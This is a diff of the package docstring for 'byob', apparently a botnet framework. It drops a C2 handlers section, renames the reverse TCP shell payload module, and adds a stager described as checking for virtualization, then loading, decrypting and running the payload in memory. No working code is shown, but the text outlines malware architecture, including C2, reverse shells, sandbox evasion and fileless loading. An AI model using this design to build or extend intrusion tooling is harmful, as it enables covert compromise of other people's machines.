@@ -39,13 +39,6 @@ byob.core
   byob.core.util
     miscellaneous utility functions that are used by many modules
 
-  byob.core.handlers
-    request handlers which can be paired with the base Server class to form
-    3 different types of server instances which the C2 runs in parallel
-     - Request Handler: handles requests for files in the byob.remote package
-     - Session Handler: handles client sessions & server-side of reverse TCP shells
-     - Task Handler:    handles completed tasks by updating issued tasks in database
-
   byob.core.security
     module containing the Diffie-Hellman Internet Key Exchange (RFC 2741)
     method for securing a shared secret key even over insecure networks,
@@ -61,10 +54,15 @@ byob.core
     it can be directly imported into the currently running process, without
     writing anything to the disk (not even temporary files - zero IO system calls)
 
-  byob.core.payload
+  byob.core.payloads
     reverse TCP shell designed to remotely import post-exploitation modules from
     server, along with any packages/dependencies), complete tasks issued by
     the server, and handles connections & communication at the socket-level
+
+  byob.core.stagers
+    payload stager for the main reverse TCP shell payload that checks environment
+    for virtualization before remotely loading payload, decrypting it in-memory, 
+    and then executing it 
 
   byob.core.generators
     module containing functions which all generate code by using the arguments
@@ -128,7 +126,7 @@ byob.modules
     droppers to load & execute on target host machines
 
 """
-__all__         = ['database','generators','handlers','loader','payload','security','stager','util']
+__all__         = ['database','generators','loader','payloads','security','stagers','util']
 __version__     = '0.1.5'
 __license__     = 'GPLv3'
 __author__      = 'Daniel Vega-Myhre'
